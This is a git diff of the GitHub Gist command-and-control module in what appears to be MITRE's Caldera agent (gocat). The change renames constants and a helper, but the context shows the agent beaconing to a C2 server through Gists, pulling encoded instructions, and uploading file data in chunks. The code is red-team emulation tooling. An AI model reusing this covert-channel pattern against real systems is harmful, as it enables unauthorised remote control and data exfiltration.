@@ -7,8 +7,6 @@ import (
 	"errors"
 	"fmt"
 	"math"
-	"math/rand"
-	"strconv"
 	"time"
 
 	"github.com/mitre/gocat/output"
@@ -21,9 +19,9 @@ const (
 	githubTimeout = 60
 	githubTimeoutResetInterval = 5
 	githubError = 500
-	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
-	beaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
-	maxDataChunkSize = 750000 // Github GIST has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
+	gistBeaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
+	gistBeaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
+	gistMaxDataChunkSize = 750000 // Github GIST has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
 )
 
 var (
@@ -41,7 +39,7 @@ func init() {
 
 //GetInstructions sends a beacon and returns instructions
 func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
-	checkValidGistSleepInterval(profile, githubTimeout, githubTimeoutResetInterval)
+	checkValidSleepInterval(profile, githubTimeout, githubTimeoutResetInterval)
 	var retBytes []byte
 	bites, heartbeat := gistBeacon(profile)
 	if heartbeat == true {
@@ -109,11 +107,11 @@ func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string,
 	// Upload file in chunks
 	uploadId := getRandomIdentifier()
 	dataSize := len(data)
-	numChunks := int(math.Ceil(float64(dataSize) / float64(maxDataChunkSize)))
+	numChunks := int(math.Ceil(float64(dataSize) / float64(gistMaxDataChunkSize)))
 	start := 0
 	gistName := getGistNameForUpload(paw)
 	for i := 0; i < numChunks; i++ {
-		end := start + maxDataChunkSize
+		end := start + gistMaxDataChunkSize
 		if end > dataSize {
 			end = dataSize
 		}
@@ -122,7 +120,7 @@ func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string,
 		if err := uploadFileChunkGist(gistName, gistDescription, chunk); err != nil {
 			return err
 		}
-		start += maxDataChunkSize
+		start += gistMaxDataChunkSize
 	}
 	return nil
 }
@@ -147,7 +145,7 @@ func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 	heartbeat := createHeartbeatGist("beacon", profile)
 	if heartbeat {
 		//collect instructions & delete
-		for failCount < beaconResponseFailThreshold {
+		for failCount < gistBeaconResponseFailThreshold {
 			contents := getGists("instructions", profile["paw"].(string));
 			if contents != nil {
 				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
@@ -158,7 +156,7 @@ func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 				return decodedContents, heartbeat
 			}
 			// Wait for C2 server to provide instruction response gist.
-			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
+			time.Sleep(time.Duration(float64(gistBeaconWait)) * time.Second)
 			failCount += 1
 		}
 		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
